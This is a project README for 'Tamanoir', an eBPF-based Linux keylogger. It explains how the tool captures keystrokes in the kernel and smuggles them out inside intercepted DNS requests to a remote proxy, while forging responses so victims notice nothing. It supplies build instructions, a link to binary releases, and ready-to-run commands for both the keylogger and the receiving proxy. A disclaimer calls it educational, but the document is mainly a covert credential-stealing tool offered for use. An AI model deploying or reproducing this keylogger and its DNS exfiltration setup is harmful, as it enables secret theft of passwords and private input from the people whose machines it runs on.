<div align="center">
  <h1> Tamanoir <br> A KeyLogger using eBPF 🐝 </h1>
  <img src="https://github.com/user-attachments/assets/47b8a0ef-6a52-4e2d-8188-e77bb9e98d79" style="width: 40%; height: 40%"</img>
  <p><small>
    <i>
      A large anteater of Central and South America, Myrmecophaga tridactyla
    </i>
  </small></p>
</div>

## 💡Overview

<div align="center">
  <img src="https://github.com/user-attachments/assets/24f80020-9d60-4f2a-825b-ed56574dfb24" </img>
</div>

1. Capture keystrokes and store them in a queue in the kernel.
2. Intercept DNS requests and inject the captured keystroes in the DNS payload then redirect the request designated remote server acting as a DNS proxy.
3. On the remote server, extract the keys from the DNS payload and send a valid DNS response.
4. Intercept the response and modify its source address so the initial request will complete successfully.

<br>

## 🚀 Setup

You need a Linux based OS.

### ⚒️ Build from source

To build from source, make sure you have:

- [bpf-linker](https://github.com/aya-rs/bpf-linker) installed.
- [Rust](https://www.rust-lang.org/tools/install) installed with `nightly` toolchain.

#### 1. Build ebpf program

```
cd tamanoir-ebpf
cargo build --release
```

#### 2. Build user space program

```
cargo build --release
```

This will produce an executable file at `target/release/tamanoir` that you can copy to a directory in your `$PATH`

#### 3. Build proxy program

```
cargo build -p tamanoir-proxy --release
```

This will produce an executable file at `target/release/tamanoir-proxy` that you can copy to a directory in your `$PATH`

### 📥 Binary release

You can download the pre-built binaries from the [release page](https://github.com/pythops/tamanoir/releases)

<br>

## 🪄 Usage

### Tamanoir

```
RUST_LOG=info sudo -E tamanoir \
              --proxy-ip <DNS proxy IP> \
              --hijack-ip <locally configured DNS server IP> \
              --layout <keyboard layout> \
              --iface <network interface name>
```

for example:

```
RUST_LOG=info sudo -E tamanoir \
              --proxy-ip 192.168.1.75 \
              --hijack-ip 8.8.8.8 \
              --layout 0 \
              --iface wlan0
```

Currenly, there are two supported keyboard layouts:

`0` : qwerty (us)

`1` : azerty (fr)

<br>

### DNS Proxy

> [!NOTE]
> Make sure port 53 is available

```
RUST_LOG=info sudo -E tamanoir-proxy \
              --port <port> \
              --dns-ip <DNS server ip> \
              --payload-len <payload length>
```

for example:

```
RUST_LOG=info sudo -E tamanoir-proxy \
              --port 53 \
              --dns-ip 1.1.1.1 \
              --payload-len 8
```

<br>

## ⚠️ Disclaimer

`Tamanoir` is developed for educational purposes only

<br>

## ✍️ Authors

[Badr Badri](https://github.com/pythops)

[Adrien Gaultier](https://github.com/adgaultier)

<br>

## ⚖️ License

GPLv3
